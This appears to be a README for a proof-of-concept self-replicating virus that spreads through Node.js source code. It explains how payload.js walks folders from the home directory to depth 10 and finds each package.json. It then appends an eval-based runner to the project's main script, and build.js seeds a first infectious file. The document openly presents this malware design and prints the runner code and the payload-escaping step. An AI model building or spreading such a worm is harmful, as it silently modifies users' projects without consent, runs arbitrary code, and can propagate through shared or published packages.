Proof of Concept Node.js src virus
==================================

## Files

### `payload.js`

This script declares a global function: `global.infect`. It takes one argument: `payload`, which is the string representation of some javascript code to be injected.

`global.infect` works by recursively scanning folders (from the home directory), looking for a `package.json`. The scan will continue until a maximum depth of 10 before aborting. For each `package.json` found, it reads the contents to deduce the main script file (defaulting to `index.js` if not specified in `package.json`). If the main script indeed exists, the following fragment of code is appended to the file:

```javascript
    (function() {
        var payload = "<ESCAPED_PAYLOAD>";
        eval(payload);
        global.infect( payload );
    })();
```

Lets call this fragment of code, a **runner**. N.B. `<ESCAPED_PAYLOAD>` is the input argument of `global.infect` transformed as follows:

```javascript
    payload.replace( /[\\"]/g, "\\$&" )
```

To actually create the virus, we simply run the `global.infect` function on a minified representation of itself (i.e. `payload.js`). 


### `build.js`

This script simply creates a new file with the runner. The payload is set as the string representation of the minified `payload.js`. Essentially this can be thought of as infecting a blank/empty JS script. The resultant file is now "infectious", and running it will cause the virus to propagate as described above.
